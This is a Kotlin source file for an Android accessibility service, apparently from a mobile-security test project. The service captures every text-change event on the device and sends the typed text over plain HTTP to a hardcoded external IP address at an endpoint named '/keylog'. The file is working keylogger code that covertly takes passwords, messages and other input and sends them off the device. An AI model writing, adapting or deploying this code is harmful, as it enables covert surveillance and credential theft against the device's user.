package com.example.testmobsec

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.Date

class MyAccessibilityService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        when (event?.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.toString()
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
//                val uuid = SystemDetails.getUUID(this)
                Log.d("AccessibilityService", "Text changed: $text")
                val details = JSONObject().apply {
//                    put("UUID", uuid)
                    put("EventType", "Text Changed")
                    put("Details", text)
                    put("Timestamp", timestamp)
                }
                GlobalScope.launch(Dispatchers.IO) {
                sendDetailsToServer(details)
                }
            }
            // Handle other event types if needed
        }
    }

    private fun sendDetailsToServer(details: JSONObject) {
        val url = URL("http://13.92.41.98:5000/keylog")
        val connection = url.openConnection() as HttpURLConnection
        try {
            connection.doOutput = true
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(details.toString())
                writer.flush()
            }
            if (connection.responseCode == HttpURLConnection.HTTP_OK) {
                Log.d("AccessibilityService", "Details sent successfully")
            } else {
                Log.e("AccessibilityService", "Failed to send details: ${connection.responseMessage}")
            }
        } catch (e: Exception) {
            Log.e("AccessibilityService", "Exception: ${e.message}")
        } finally {
            connection.disconnect()
        }
    }

    override fun onInterrupt() {
        // Code to handle the interruption of the service
    }

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo().apply {
            // Listen to types of events; you can adjust these based on your needs.
            // FLAG_REQUEST_TOUCH_EXPLORATION_MODE enables the service to receive events
            // for all touch events via the onTouchEvent() method.
            eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED

            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK

            // Set the timeout after an event is received.
            notificationTimeout = 100

            // This flag requests the capability to retrieve the active window content.
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS

        }
        this.serviceInfo = info
    }

}